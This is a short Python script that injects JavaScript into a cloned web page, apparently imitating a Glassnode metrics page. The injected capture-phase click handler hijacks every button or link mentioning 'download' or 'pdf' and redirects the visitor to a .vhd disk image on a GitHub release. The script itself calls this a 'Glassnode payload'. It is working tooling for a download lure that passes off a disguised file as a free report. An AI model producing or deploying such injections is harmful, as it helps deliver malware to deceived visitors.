import os
import re

path = "gn_metrics_11a/index.html"
if not os.path.exists(path):
    path = "volumes/gn_metrics_11a/index.html"
    if not os.path.exists(path):
        print("[-] Error: Could not find gn_metrics_11a/index.html")
        exit()

with open(path, "r", encoding="utf-8") as f:
    content = f.read()

# 1. Clean out the previous script that was getting destroyed by DOM re-renders
content = re.sub(r'<script>\s*document\.addEventListener\(\'DOMContentLoaded\'.*?</script>\s*(</body>)?', '</body>', content, flags=re.DOTALL)

# 2. Inject the Global Event Delegation script (Capture Phase)
override_script = """
<script>
// The 'true' argument forces the Capture Phase, intercepting the click at the window level
document.addEventListener('click', function(e) {
    const btn = e.target.closest('a, button');
    if (!btn) return;

    const text = (btn.innerText || btn.value || '').toLowerCase();

    // Target ONLY the final download button, ignoring the 'Get Free Report' intro buttons
    if (text.includes('download') || text.includes('pdf')) {
        e.preventDefault();
        e.stopPropagation();
        window.location.href = 'https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd';
    }
}, true);
</script>
</body>
"""

content = content.replace('</body>', override_script)

with open(path, "w", encoding="utf-8") as f:
    f.write(content)

print("[+] SUCCESS: Glassnode payload secured with Global Event Delegation.")